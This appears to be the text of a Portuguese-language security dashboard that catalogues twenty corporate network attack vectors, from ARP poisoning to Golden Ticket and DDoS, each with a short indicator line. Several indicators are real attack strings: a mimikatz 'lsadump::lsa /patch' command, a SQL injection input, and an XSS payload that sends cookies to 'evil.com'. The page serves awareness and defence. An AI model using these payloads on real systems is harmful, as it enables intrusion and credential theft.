NETWORK_OBSERVER
LAYER: 7_APPLICATION

Matriz de Ameaças: Intra & Extranet

Monitoramento de vetores de ataque em infraestrutura de rede corporativa e conexões externas.

01. Lateral Movement Intranet

Navegação interna após infecção inicial para elevar privilégios e alcançar o Domain Controller.

$ net view /domain
[EXPL] SMB_Relay_Attack
Falha na segmentação de rede permite acesso irrestrito.
02. Supply Chain Breach Extranet

Comprometimento de fornecedores com acesso VPN para injetar pacotes maliciosos na rede principal.

SOURCE: VENDOR_API_KEY
STATUS: Unauthorized_Access
Dependência de segurança de terceiros sem auditoria.
03. ARP Poisoning (MITM) Intranet

Interceptação de dados em trânsito dentro da rede local falsificando tabelas ARP.

ARP_RESP: Gateway is at [ATTACKER_MAC]
Captura de credenciais trafegando via HTTP ou FTP.
04. VPN Gateway Exploit Extranet

Exploração de vulnerabilidades em concentradores de VPN para ignorar autenticação.

CVE-2024: Bypass Auth via Buffer Overflow
Gateways obsoletos são a porta de entrada para ransomware.
05. LLMNR Poisoning Intranet

Respostas falsas a buscas de nomes de rede para capturar Hashes NTLM de usuários.

TOOL: Responder.py
HASH: NTLMv2 Captured
Protocolos legados ativos facilitam roubo de senhas.
06. Session Hijacking Extranet

Roubo de cookies de sessão de parceiros para acessar portais B2B sem senha.

ID: 992-SESSION-REPLAY
AUTH: Hijacked
Sessões sem expiração ou vinculação de IP são vulneráveis.
07. Golden Ticket (AD) Intranet

Criação de tickets Kerberos forjados que garantem acesso total vitalício ao domínio.

MIMIKATZ: lsadump::lsa /patch
Acesso nível "Deus" ao Active Directory corporativo.
08. API Key Leakage Extranet

Exposição de chaves de integração em repositórios ou documentação acessível por parceiros.

LOG: Authorization: Bearer [REDACTED]
Permite que o atacante simule ser uma aplicação legítima.
09. Rogue Access Point Intranet

Instalação de roteadores Wi-Fi não autorizados que burlam o firewall da empresa.

SSID: "FREE_WIFI_CORP" [ROGUE]
Cria um túnel direto para dentro da rede protegida.
10. B2B Portal SQLi Extranet

Injeção de comandos SQL em formulários de extranet para vazar dados de outros clientes.

INPUT: ' OR 1=1 -- [INJECTED]
Vazamento massivo de dados de parceiros de negócios.
11. Pass-the-Hash Intranet

Uso de hashes de senhas capturados na memória para autenticar em outros servidores.

AUTH: SMB Login with [HASH]
O atacante não precisa da senha real, apenas do hash.
12. DNS Tunneling Extranet

Exfiltração de dados camuflados como consultas DNS para burlar firewalls de saída.

QUERY: [DATA].malicious.com
Tráfego oculto em protocolos que parecem inofensivos.
13. PrintNightmare Exploit Intranet

Uso do serviço de impressão do Windows para obter privilégios de Administrador local.

SPOOLER: RCE via AddPrinterDriver
Serviços secundários vulneráveis derrubam a segurança total.
14. Insecure Direct Obj Reference Extranet

Manipulação de URLs na Extranet para acessar documentos de outros usuários.

URL: /invoice/1005 -> /invoice/1006
Falha na validação de permissões por registro.
15. SMB Ghost Attack Intranet

Exploração de vulnerabilidade no protocolo SMBv3 para execução remota de código.

SMBv3: Decompression Vulnerability
Ataque silencioso que compromete servidores Windows.
16. Cross-Site Scripting (XSS) Extranet

Injeção de scripts em portais de suporte para roubar senhas de funcionários.

SCRIPT: fetch('evil.com?c='+doc.cookie)
Execução de código malicioso no navegador do usuário.
17. Shadow IT Intranet

Uso de softwares não autorizados (ex: AnyDesk pessoal) que abrem brechas de segurança.

PROCESS: remote_access.exe [UNTRUSTED]
Ferramentas úteis para usuários, fatais para a TI.
18. Credential Brute Forcing Extranet

Tentativas massivas de login em portais VPN/Extranet usando dicionários de senhas.

LOG: 500 failed login attempts/min
Ausência de bloqueio de IP ou MFA facilita o ataque.
19. VLAN Hopping Intranet

Ataque que permite ao invasor saltar de uma rede convidada para a rede administrativa.

PROTO: 802.1Q Double Tagging
A segmentação lógica de rede falhou devido a má configuração.
20. Distributed DoS Extranet

Sobrecarga do gateway da Extranet para derrubar a comunicação com parceiros e clientes.

TRAFFIC: 10Gbps SYN_FLOOD Detected
Interrupção de serviços críticos de negócios externos.
LOG_SESSION: SECURITY_MATRIX_2026 | PROTECTING ASSETS | ENCRYPT EVERYTHING
